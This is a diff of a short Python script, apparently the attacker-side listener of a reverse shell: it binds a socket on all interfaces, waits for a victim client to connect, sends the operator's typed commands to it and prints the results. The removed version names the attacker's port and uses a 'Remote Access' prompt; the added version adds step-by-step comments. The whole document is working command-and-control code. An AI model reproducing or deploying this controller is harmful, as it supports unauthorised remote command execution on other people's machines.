@@ -1,19 +1,33 @@
 import socket
-ip="0.0.0.0" #Do not change
-port=8080 # Same port than attacker's one
-c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-c.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-c.bind((ip,port))
-c.listen(1)
-conn,addr=c.accept()
-print('<+> Connected to ',addr,' and listening on port ',str(port))
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 5003
+# send 1024 (1kb) a time (as buffer size)
+BUFFER_SIZE = 1024
+# create a socket object
+s = socket.socket()
+# bind the socket to all IP addresses of this host
+s.bind((SERVER_HOST, SERVER_PORT))
+s.listen(5)
+print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+# accept any connections attempted
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
+# just sending a message, for demonstration purposes
+message = "Hello and Welcome".encode()
+client_socket.send(message)
 while True:
-     command=input("Remote Access -->> ")
-     if command=='exit':
-          conn.send(b'exit')
-          conn.close()
-          break
-     else:
-          conn.send(command.encode())
-          output=conn.recv(1024)
-          print(output)
+    # get the command from prompt
+    command = input("Enter the command you wanna execute:")
+    # send the command to the client
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    # retrieve command results
+    results = client_socket.recv(BUFFER_SIZE).decode()
+    # print them
+    print(results)
+# close connection to the client
+client_socket.close()
+# close server connection
+s.close()
